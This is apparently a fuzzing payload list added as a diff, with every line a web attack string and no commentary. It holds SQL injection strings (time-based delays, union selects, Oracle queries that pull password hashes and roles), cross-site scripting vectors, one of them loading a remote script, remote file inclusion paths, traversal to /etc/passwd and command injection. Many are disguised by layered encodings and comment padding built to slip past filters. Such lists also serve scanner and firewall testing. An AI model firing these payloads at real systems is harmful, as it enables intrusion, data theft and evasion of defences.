+%252F%2573%2563%2572%2569%2570%2574%252F%256D%2565%256E%2575%252F%256D%2565%256E%2575%2570%2572%2569%256E%2563%2569%2570%2561%256C%252E%2570%2568%2570%253F%2570%2561%2574%2568%255F%2569%256E%2563%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%u002F%u0063%u006F%u006D%u0070%u006F%u006E%u0065%u006E%u0074%u0073%u002F%u0063%u006F%u006D%u005F%u0070%u0068%u0070%u0073%u0068%u006F%u0070%u002F%u0074%u006F%u006F%u006C%u0062%u0061%u0072%u002E%u0070%u0068%u0070%u0073%u0068%u006F%u0070%u002E%u0068%u0074%u006D%u006C%u002E%u0070%u0068%u0070%u003F%u006D%u006F%u0073%u0043%u006F%u006E%u0066%u0069%u0067%u005F%u0061%u0062%u0073%u006F%u006C%u0075%u0074%u0065%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+/wp-cache-phase1.php?plugin=XXpathXX and '0having'='0having'
+/js/bbcodepress/bbcode-form.php?BBCODE_path LIKE XXpathXX
+'--%0Aunion--%0Aselect--%0A1,2,3,x,x,x,x,@@version,x每
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20---- sp_password
+%C0%AF%C0%AE%C0%AE%C0%DE%C0%DE%C0%AE%C0%AE%C0%DE%C0%DE%C0%AE%C0%AE%C0%DE%C0%DE%C0%AE%C0%AE%C0%DE%C0%DE%C0%AE%C0%AE%C0%DE%C0%DE%C0%AE%C0%AE%C0%DE%C0%DE%C0%AE%C0%AE%C0%DE%C0%DE%C0%AE%C0%AE%C0%DE%C0%DE%C0%FBFILE%C0%FF
+<form><button%09formaction="javascript:alert(XSS)">lol
+' or 1=1 or ''='
+%u002F%u0063%u0068%u0061%u006C%u006C%u0065%u006E%u0067%u0065%u002E%u0070%u0068%u0070%u003F%u0076%u0077%u0061%u0072%u005F%u0072%u006F%u006F%u0074%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%2F%63%72%6F%6E%2E%70%68%70%3F%69%6E%63%6C%75%64%65%5F%70%61%74%68%3D%58%58%70%61%74%68%58%58%3F
+/common.php?dir LIKE XXpathXX
+or 4479=4479/*!or*/""=
+%u002F%u006D%u006F%u0064%u0075%u006C%u0065%u0073%u002F%u0034%u006E%u0041%u006C%u0062%u0075%u006D%u002F%u0070%u0075%u0062%u006C%u0069%u0063%u002F%u0064%u0069%u0073%u0070%u006C%u0061%u0079%u0043%u0061%u0074%u0065%u0067%u006F%u0072%u0079%u002E%u0070%u0068%u0070%u003F%u0062%u0061%u0073%u0065%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+,NULL)%20waitfor%20delay%20'0:0:20'%20--
+%u002F%u0062%u006C%u006F%u0063%u006B%u0073%u002F%u0062%u0069%u0072%u0074%u0068%u0064%u0061%u0079%u002E%u0070%u0068%u0070%u003F%u0066%u0075%u006C%u006C%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+&#X00003Csp_password
+/administrator/components/com_clickheat/includes/overview/main.jsp?mosConfig_absolute_path=$$path$$
+&lt;BGSOUND SRC LIKE \"javascript&#058;alert('XSS');\"&gt;
+%00%27,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+/ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ\$$\$$\$$\$$\$$\$$\$$\{FILE}
+%2F%75%70%6C%6F%61%64%2F%74%6F%70%2E%70%68%70%3F%6D%61%69%6E%64%69%72%3D%58%58%70%61%74%68%58%58%3F
+/controllers/MySQLController.php?baseDir=XXpathXX%00
+'/*!AND*/1=utl_inaddr.get_host_address((/*!SELECT*/DISTINCT(granted_role)/*!FROM*/(/*!SELECT*/DISTINCT(granted_role), ROWNUM/*!AS*//*!LIMIT*//*!FROM*/dba_role_privs/*!WHERE*/GRANTEE=SYS.LOGINUSER)/*!WHERE*//*!LIMIT*/=5))/*!AND*/'i'='i
+'/**/or/**/1=1/**//*
+<% foo><x foo LIKE "%><script>alert(123)</script>">
+L2luZGV4LnBocD9DT05GSUdbTVdDSEFUX0xpYnNdPVhYcGF0aFhYPw==
+/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}-- sp_password
+%u002F%u0042%u0065%u0074%u0061%u0042%u006C%u006F%u0063%u006B%u004D%u006F%u0064%u0075%u006C%u0065%u0073%u002F%u0046%u006C%u0069%u0063%u006B%u0072%u004D%u006F%u0064%u0075%u006C%u0065%u002F%u0046%u006C%u0069%u0063%u006B%u0072%u004D%u006F%u0064%u0075%u006C%u0065%u002E%u0070%u0068%u0070%u003F%u0070%u0061%u0074%u0068%u005F%u0070%u0072%u0065%u0066%u0069%u0078%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+"%23dfTjguk%0Aor%23azezqWYgJQt%0A4479=4479%23dRdIzOUQfJ%0A--
+%2522%252B%2569%2566%2528%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%2520%252F%252A
+'/*!0union (/*!0select/*!0NULL,/*!0NULL, (/*!0select @@/*!0version)) --
+%C0%AFadmin%C0%AFadmin%C0%DFtopic%C0%DFaction%C0%DFlogging%C0%AEphp%C0%BFsetmodules%C0%BFpagestart%C0%AEphpbb%C0%DFroot%C0%DFpath%C0%BFXXpathXX
+/supasite/backend_site.php?supa[include_path]=XXpathXX
+%u002F%u002E%u002E%u0025%u0035%u0063%u002E%u002E%u0025%u0035%u0063%u002E%u002E%u0025%u0035%u0063%u002E%u002E%u0025%u0035%u0063%u002E%u002E%u0025%u0035%u0063%u002E%u002E%u0025%u0035%u0063%u007B%u0046%u0049%u004C%u0045%u007D
+%3C%69%66%72%61%6D%65%20%78%6D%6C%6E%73%3D%22%23%22%20%73%72%63%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29%22%3E%3C%2F%69%66%72%61%6D%65%3E
+%/%w%-%a%g%o%r%a%_%p%a%t%h%/%m%o%d%e%r%a%t%e%_%n%o%t%e%s%.%p%h%p%?%b%n%_%d%i%r%_%d%e%f%a%u%l%t%=%X%X%p%a%t%h%X%X%?
+<XSS STYLE LIKE "xss:expression(alert('XSS'))">
+<DIV%08STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+%252F%2569%256E%2563%256C%2575%2564%2565%252F%2574%2568%2565%256D%2565%2573%252F%2574%2568%2565%256D%2565%2566%2575%256E%2563%252E%2570%2568%2570%253F%256D%2579%254E%2565%2577%2573%2543%256F%256E%2566%255B%2570%2561%2574%2568%255D%255B%2573%2579%2573%255D%255B%2569%256E%2564%2565%2578%255D%253D%2558%2558%2570%2561%2574%2568%2558%2558%253F
+%/%i%n%c%l%u%d%e%s%/%c%o%m%m%o%n%.%p%h%p%?%r%o%o%t%_%p%a%t%h%=%X%X%p%a%t%h%X%X%?
+JW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVvJW8lbyVv
+1    union     all      select  1,2,3,4,5,6,name   from  sysobjects  where   xtype = 'u' --
+/manager/static/view.php?propID LIKE 0&INC LIKE XXpathXX
+%<%s%v%g %o%n%l%o%a%d%=%"%j%a%v%a%s%c%r%i%p%t%:%a%l%e%r%t%(%1%2%3%)%" %x%m%l%n%s%=%"%#%"%>%<%/%s%v%g%>
+"a"" or 3 LIKE 3--"
+%C0%AF%C0%ABif%C0%AAbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%C0%AENULL%C0%AENULL%C0%AB%C0%AB%20%23
+&lt;IMG+SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
+L2NvbXBvbmVudHMvY29tX2ZhY2lsZWZvcm1zL2ZhY2lsZWZvcm1zLmZyYW1lLnBocD9mZl9jb21wYXRoPVhYcGF0aFhY
+%2526%2523%2578%2530%2533%2563%253B
+%u002F%u0070%u0068%u0070%u006C%u0069%u0062%u002F%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u002F%u0031%u002E%u0033%u002E%u0033%u002F%u006D%u006F%u0064%u0075%u006C%u0065%u002F%u0068%u0067%u005F%u0072%u0065%u0066%u0065%u0072%u0065%u006E%u007A%u005F%u006A%u006F%u0062%u0067%u0061%u006C%u0065%u0072%u0069%u0065%u002E%u0070%u0068%u0070%u003F%u0074%u0074%u005F%u0064%u006F%u0063%u0072%u006F%u006F%u0074%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+select current_user;
+%C0%AFmodules%C0%AFuseradm%C0%AFindex%C0%AEphp%C0%BFfull%C0%DFpath%C0%BFXXpathXX
+@var%0Dselect%0B@var%09as%0Dvar%0Binto%0Btemp%0Aend%0D--
+&lt;!--&#91;if%0Bgte%0CIE%0B4&#93;&gt;
+%26%6C%74%3B%4D%45%54%41%20%48%54%54%50%2D%45%51%55%49%56%3D%5C%22%53%65%74%2D%43%6F%6F%6B%69%65%5C%22%20%43%6F%6E%74%65%6E%74%3D%5C%22%55%53%45%52%49%44%3D%26%6C%74%3B%53%43%52%49%50%54%26%67%74%3B%61%6C%65%72%74%28%27%58%53%53%27%29%26%6C%74%3B%2F%53%43%52%49%50%54%26%67%74%3B%5C%22%26%67%74%3B
+%252F%2569%256E%2564%2565%2578%252E%2570%2568%2570%253F%2543%254F%254E%2546%2549%2547%255B%254D%2557%2543%2548%2541%2554%255F%254C%2569%2562%2573%255D%253D%2558%2558%2570%2561%2574%2568%2558%2558%253F
+%253B%2569%2564
+/menu.php?functions_file=XXpathXX and '0having'='0having'
+%u002F%u0063%u006C%u0061%u0073%u0073%u0065%u0073%u002F%u0062%u006F%u0061%u0072%u0064%u005F%u006F%u002E%u0070%u0068%u0070%u003F%u0061%u0062%u0073%u006F%u006C%u0075%u0074%u0065%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+"%0Cand%0C0=benchmark(3000000,MD5(1))%20/*
+<IMG%23SyKCwzbttX%0ASRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+/ATutor/include/classes/MOdulE/MOdulE.class.php?row[dir_name]=XXpathXX
+&lt;IMG--%0ASRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
+%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22%00
+'+/*!if*/(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20--
+%252F%2562%256C%256F%2567%2563%256D%2573%252F%2561%2564%256D%2569%256E%252F%2578%256D%256C%2572%2570%2563%252F%2573%2565%2572%2576%2565%2572%252E%2570%2568%2570%253F%2544%2549%2552%255F%254C%2549%2542%2553%253D%2558%2558%2570%2561%2574%2568%2558%2558%253F
+<form /*!00000id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION*/
+%252F%2563%256F%2572%2565%252F%2561%2564%256D%2569%256E%252F%256C%256F%2567%2569%256E%252E%2570%2568%2570%253F%2561%2562%2573%256F%256C%2575%2574%2565%2575%2572%256C%2558%2558%2570%2561%2574%2568%2558%2558
+),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20waitfor%20delay%20'0:0:20'%20--
+%2F%73%6B%69%6E%73%2F%64%65%66%61%75%6C%74%2E%70%68%70%3F%64%69%72%5F%69%6E%63%3D%58%58%70%61%74%68%58%58
+L2xpYnJhcmllcy9kYXRhYmFzZS5waHA/cGF0aD1YWHBhdGhYWD8/Pw==
+%C0%AFtheme%C0%AFframes1%C0%DFleft%C0%AEphp%C0%BFroot%C0%BFXXpathXX
+),NULL)%20waitfor%20delay%20'0:0:20'%20-- and '0having'='0having'
+JyBBTkQgMT11dGxfaW5hZGRyLmdldF9ob3N0X2FkZHJlc3MoKFNFTEVDVCBESVNUSU5DVChjb2x1bW5fbmFtZSkgRlJPTSAoU0VMRUNUIERJU1RJTkNUKGNvbHVtbl9uYW1lKSwgUk9XTlVNIEFTIExJTUlUIEZST00gYWxsX3RhYl9jb2x1bW5zKSBXSEVSRSBMSU1JVD0zKSkgQU5EICdpJz0naQ==
+%2F%76%61%72%2F%6C%6F%67%2F%61%63%63%65%73%73%5F%6C%6F%67
+%/%v%a%r%/%w%w%w%/%l%o%g%s%/%e%r%r%o%r%_%l%o%g
+';waitfor delay '0:0:__TIME__'--
+&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;%00
+x' o/**/r name()='username' o/**/r 'x'='y
+))))/**/waitfor/**/delay/**/'0:0:20'/**//*
+%2579%2520%2527%2520%256F%2572%2520%2531%2530%2520%253E%2520%2539
+'),(select%20if(count(*)! LIKE -1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+or/**/'W'='W'/**/--
+%00%27 AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND %00%27i%00%27=%00%27i
+/index.php?path_to_folder=XXpathXX?cmd=id and '0having'='0having'
+/modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=XXpathXX%00
+%2F%68%74%64%6F%63%73%2F%67%6D%61%70%66%61%63%74%6F%72%79%2F%70%61%72%61%6D%73%2E%70%68%70%3F%67%73%7A%41%70%70%50%61%74%68%3D%58%58%70%61%74%68%58%58
+L2Jsb2djbXMvaW5kZXgucGhwP0RJUl9QTFVHSU5TPVhYcGF0aFhYPw==
+$#lt;IFRAME SRC=\"javadom$##058;alert('XSS');\"$#gt;$#lt;/IFRAME$#gt;
+%&%#%x%0%3%c
+/common.inc.php?CFG[libdir]=XXpathXX and '0having'='0having'
+'%0Dor%0A1=1%0Cor%0D''='
+' and 1=utl_inaddr.get_host_address((select global_name from global_name)) and 'i'='i
+%u0022%u002B%u0069%u0066%u0028%u0062%u0065%u006E%u0063%u0068%u006D%u0061%u0072%u006B%u0028%u0033%u0030%u0030%u0030%u0030%u0030%u0030%u002C%u004D%u0044%u0035%u0028%u0031%u0029%u0029%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u0029%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u0029%u0020%u0023
+IikgYW5kIDA9YmVuY2htYXJrKDMwMDAwMDAsTUQ1KDEpKSUyMC8q
+/,,\,,\\,,\{/etc/inir.d/}
+;echo 111111-- sp_password
+%252F%252E%252F%252F%252E%252E%252F%252F%252E%252F%252F%252E%252E%252F%252F%252E%252F%252F%252E%252E%252F%252F%252E%252F%252F%252E%252E%252F%252F%252E%252F%252F%252E%252E%252F%252F%252E%252F%252F%252E%252E%252F%252F%252E%252F%252F%252E%252E%252F%252F%252E%252F%252F%252E%252E%252F%252F%257B%2546%2549%254C%2545%257D
+/gepi/gestion/savebackup.php?filename=XXpathXX&cmd=cat/etc/passwd-- sp_password
+%'%|%|%'%6
+'/*!AND*/1=utl_inaddr.get_host_address((/*!SELECT*/DISTINCT(granted_role)/*!FROM*/(/*!SELECT*/DISTINCT(granted_role), ROWNUM/*!AS*//*!LIMIT*//*!FROM*/dba_role_privs/*!WHERE*/GRANTEE=SYS.LOGINUSER)/*!WHERE*//*!LIMIT*/=3))/*!AND*/'i'='i
+/$$$$\$$$$\{FILE}
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23 and '0having'='0having'
+/script/index.php?path_inc=XXpathXX%00
+9999"||(select%23kuUWbE%0Alike('abcdefg',upper(hex(randomblob(150000000)))))||"9999
+/header.php?wwwRoot=XXpathXX-- sp_password
+/editsite.php?returnpath=XXpathXX-- sp_password
+/components/com_reporter/processor/reporter.  sql   .php?mosConfig_absolute_path=XXpathXX
++/*!if*/(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20--
+%2F%69%6E%64%65%78%2E%70%68%70%3F%62%6F%64%79%3D%58%58%70%61%74%68%58%58
+/BetaBlockModules/NetworkResultContentModule/NetworkResultContentModule.aspx?path_prefix=EEpathEE
+")))) and 0=benchmark(3000000,MD5(1))%20%23-- sp_password
+LyUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZntGSUxFfQ==
+/checkout.php?abs_path=XXpathXX%00
+/\\/\\.\/\\\/\\..\/\\\/\\.\/\\\/\\..\/\\\/\\.\/\\\/\\..\/\\\/\\.\/\\\/\\..\/\\\/\\.\/\\\/\\..\/\\\/\\.\/\\\/\\..\/\\\/\\.\/\\\/\\..\/\\\/\\.\/\\\/\\..\/\\\/\\{/\\/\\etc/\\/\\passwd}
+/modules/guestbook/index.php?CONFIG[local_root]=XXpathXX?
+%5c%r%5c%n
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20---- sp_password
+%/%a%d%v%a%n%c%e%d%_%c%o%m%m%e%n%t%_%s%y%s%t%e%m%/%i%n%d%e%x%.%p%h%p%?%A%C%S%_%p%a%t%h%=%X%X%p%a%t%h%X%X%?
+%2F%61%64%6D%69%6E%2F%6C%69%62%5F%61%63%74%69%6F%6E%5F%73%74%65%70%2E%70%68%70%3F%47%4C%4F%42%41%4C%53%5B%43%4C%41%53%53%5F%50%41%54%48%5D%3D%58%58%70%61%74%68%58%58
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+/.\/\.\{/etc/passwd}
+/../../../../../../../../{FILE}-- sp_password
+'%0AAND%0C1=utl_inaddr.get_host_address((SELECT%09DISTINCT(PASSWORD)%0AFROM%0B(SELECT%0CDISTINCT(PASSWORD),%0CROWNUM%0BAS%09LIMIT%0AFROM%0CSYS.USER$)%0AWHERE%0ALIMIT=3))%0BAND%0D'i'='i
+//*!0mod/special/index.php?config[pathMod]=XXpathXX
+%" %o%r %"%a%"%=%"%a
+999999)) or 1=1 or ((1=1 and '0having'='0having'
+%C0%AFmodules%C0%AFxfsection%C0%AFmodify%C0%AEphp%C0%BFdir%C0%DFmodule%C0%BFXXpathXX
+,NULL)%20waitfor%20delay%20%bf%270:0:20'%20--
+/track.php?/*!path*/=XXpathXX
+%2F%6D%6F%64%75%6C%65%73%2F%64%75%6E%67%65%6F%6E%2F%74%69%63%6B%2F%61%6C%6C%69%6E%63%6C%75%64%65%66%6F%72%74%69%63%6B%2E%70%68%70%3F%50%41%54%48%5F%54%4F%5F%43%4F%44%45%3D%58%58%70%61%74%68%58%58
+',nUll,nUll,nUll,nUll,nUll)%20waitfor%20delay%20'0:0:20'%20/*
+0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
+L3RlbXBsYXRlcy9oZWFkZXIuaW5jLnBocD9yb290PVhYcGF0aFhY
+%/%l%i%b%s%/%f%t%p%.%p%h%p%?%p%a%t%h%_%l%o%c%a%l%=%X%X%p%a%t%h%X%X
+<svg /*!00000xmlns="*/#"><script>alert(1)</script></svg>
+& /*!00000ping -n 30 127.0.0.1 &*/
+L2xvYWRfbGFuZy5waHA/X1NFUldFQltzZXJ3ZWJkaXJdPVhYcGF0aFhY
+%39%39%39%39%22%20%6F%72%20%62%65%6E%63%68%6D%61%72%6B%28%31%35%30%30%30%30%30%30%2C%6D%64%35%28%30%78%34%65%34%34%36%62%36%65%29%29%20%6F%72%20%22%30%22%3D%22%39%39%39%39
+%00%27) or benchmark(10000000,MD5(1))#
+select%23AtYJZaHAHOYB%0Aname%23qXSgWc%0Afrom%23mvFOkmooLgcB%0Asysibm.systables;
+or /*!30617a=a*/
+%252F%2570%256F%2573%2574%255F%2573%2574%2561%2574%2569%2563%255F%2530%252D%2531%2531%252F%255F%256C%2569%2562%252F%2566%2563%256B%2565%2564%2569%2574%256F%2572%252F%2575%2570%256C%256F%2561%2564%255F%2563%256F%256E%2566%2569%2567%252E%2570%2568%2570%253F%2544%2544%2553%253D%2558%2558%2570%2561%2574%2568%2558%2558
+o/**/r 0=0 #"
+eHh4JS0xQU9SJS0xRHh4eD14eHg=
+%C0%AFeva%C0%AFindex%C0%AEphp3%C0%BFaide%C0%BFXXpathXX%C0%BF
+/,,///,,///,,///,,///,,///,,///,,///{/etc/passwd}
+y ' or 119 > 30000001%00
+/includes/class_template.php?quezza_root_path=XXpathXX%00
+%252F%2561%2564%256D%2569%256E%2569%252F%2569%256E%2564%2565%2578%252E%2570%2568%2570%253F%2549%254E%2543%253D%2558%2558%2570%2561%2574%2568%2558%2558%253F
+"),NULL,NULL,NULL)%20waitfor%20delay%20%00%270:0:20%00%27%20/*
+%252F%2569%256E%2564%2565%2578%252E%2570%2568%2570%253F%2562%2561%2573%2565%253D%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%C0%AFmusic%C0%AFbuycd%C0%AEphp%C0%BFHTTP%C0%DFDOCUMENT%C0%DFROOT%C0%BFXXpathXX%C0%BF
+999999%23GLgCDg%0Aor%23mxnnFJrE%0A%23xQivpSO%0A1=1%23UtXcQGy%0Aor%23eDtypeBEPrjM%0A%23HLhkLs%0A1=1
+Ly5cL1wuXC5cL1wuXHtGSUxFfQ==
+%C0%AFmodules%C0%AFadmin%C0%AFinclude%C0%AFconfig%C0%AEphp%C0%BFdoc%C0%DFroot%C0%BFXXpathXX
+/phpwcms_template/inc_script/frontend_render/navigation/config_PHPLM.php?HTML_MENU_DirPath=XXpathXX
+hi'%0Aor%0C'a'='a
+%2524%2526%2526%2564%2569%2572%252B%2563%253A%2525%2535%2563
+/plugin/HP_DEV/cms2.php?s_dir=XXpathXX?-- sp_password
+/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../{FILE} and '0having'='0having'
+L2RpcmVjdC5waHA/cmY9WFhwYXRoWFg=
+9999'||(select%23vsUkVZR%0A%23MWZymYSqMV%0Acount(*)%23FLfoFusLUtpI%0Afrom%23aFBNZefM%0A%23sHLFbwMSQ%0Ardb$fields%23IGSkRoh%0Aas%23PnVtBcg%0A%23APcBGwUju%0At1,rdb$types%23OBlEgtTtLpri%0Aas%23VSWOrqr%0A%23KhaiBRCH%0At2,rdb$collations%23iGEmntac%0Aas%23yOeTmkoN%0A%23jmlqWOr%0At3)||'9999
+JyxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwpJTIwd2FpdGZvciUyMGRlbGF5JTIwJzA6MDoyMCclMjAtLQ==
+/%uff0e%uff0e/{FILE}
+cat /*!30953/etc/passwd*/
+/..\..\..\{FILE}-- sp_password
+/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE} and '0having'='0having'
+%C0%AFphpQLAdmin%C0%AF2%C0%AE2%C0%AE7%C0%AFezmlm%C0%AEphp%C0%BF%C0%DFSESSION%C0%DBpath%C0%DF%C0%BFXXpathXX%C0%BF
+' or ''qwer''/*
+/advanced_comment_system/index.php?ACS_path=XXpathXX? and '0having'='0having'
+/ss\ss\\ss\ss\\ss\ss\\ss\\\{/etc/passwd}
+/modules/blocks/headerfile.php?system[path] LIKE XXpathXX
+%u0027%u0020%u006F%u0072%u0020%u0027%u0074%u0065%u0078%u0074%u0027%u0020%u003D%u0020%u006E%u0027%u0074%u0065%u0078%u0074%u0027
+%22%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D
+%252F%2563%256F%2572%2565%252F%2561%2564%256D%2569%256E%252F%2570%2567%2552%2553%2553%256E%2565%2577%2573%252E%2570%2568%2570%253F%2561%2562%2573%256F%256C%2575%2574%2565%2575%2572%256C%2558%2558%2570%2561%2574%2568%2558%2558
+&lt;IMG SRC=%00%27vbscript&#058;msgbox(\"XSS\")%00%27&gt;
+"<?xml%23wLIMOhdfkgv%0Aversion=""1.0""%23tdEhvKsrmB%0Aencoding=""ISO-8859-1""?><foo><![CDATA['%23iVaveGGs%0Aor%23PsQJcoTk%0A1=1%23QfrxJnGVu%0Aor%23dkIPPbuy%0A''=']]></foo>"
+%2523%2520%2566%2572%256F%256D%2520%2577%2561%2570%2569%2574%2569
+/BetaBlockModules/ShowAnnouncementModule/ShowAnnouncementModule.php?path_prefix LIKE XXpathXX
+%& %p%i%n%g %-%n %3%0 %1%2%7%.%0%.%0%.%1 %&
+<img%0Csrc=javascript:alert(&quot;XSS&quot;)>
